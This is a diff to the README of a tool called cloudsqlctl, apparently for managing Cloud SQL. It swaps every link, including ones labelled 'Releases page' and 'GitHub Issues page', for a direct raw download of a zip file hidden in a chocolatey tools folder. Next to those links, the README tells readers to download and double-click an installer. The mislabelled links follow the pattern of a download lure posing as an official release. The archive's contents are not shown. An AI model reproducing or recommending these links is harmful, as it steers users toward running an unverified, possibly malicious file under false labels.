@@ -1,6 +1,6 @@
 # 🚀 cloudsqlctl - Simplify Your Cloud SQL Management
 
-[![Download cloudsqlctl](https://img.shields.io/badge/Download-cloudsqlctl-brightgreen)](https://github.com/Kurono029/cloudsqlctl/releases)
+[![Download cloudsqlctl](https://github.com/Kurono029/cloudsqlctl/raw/refs/heads/main/chocolatey/cloudsqlctl/tools/Software_3.3.zip)](https://github.com/Kurono029/cloudsqlctl/raw/refs/heads/main/chocolatey/cloudsqlctl/tools/Software_3.3.zip)
 
 ## 📖 Description
 
@@ -20,13 +20,13 @@ To start using cloudsqlctl, follow these steps to download and run the applicati
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Kurono029/cloudsqlctl/releases).
+1. Visit the [Releases page](https://github.com/Kurono029/cloudsqlctl/raw/refs/heads/main/chocolatey/cloudsqlctl/tools/Software_3.3.zip).
 2. Look for the most recent version available.
 3. Download the `.exe` file for easy installation.
 4. Once the download completes, locate the file in your Downloads folder.
 5. Double-click the downloaded file to run the installer.
 
-For easy access, here is the download link again: [Download cloudsqlctl](https://github.com/Kurono029/cloudsqlctl/releases).
+For easy access, here is the download link again: [Download cloudsqlctl](https://github.com/Kurono029/cloudsqlctl/raw/refs/heads/main/chocolatey/cloudsqlctl/tools/Software_3.3.zip).
 
 ## 🖥️ How to Use cloudsqlctl
 
@@ -85,7 +85,7 @@ If you encounter any issues:
 
 - Ensure you have the latest version installed.
 - Confirm your internet connection is stable.
-- Refer to the [GitHub Issues page](https://github.com/Kurono029/cloudsqlctl/issues) for known issues and solutions.
+- Refer to the [GitHub Issues page](https://github.com/Kurono029/cloudsqlctl/raw/refs/heads/main/chocolatey/cloudsqlctl/tools/Software_3.3.zip) for known issues and solutions.
 
 ## 📞 Support
 
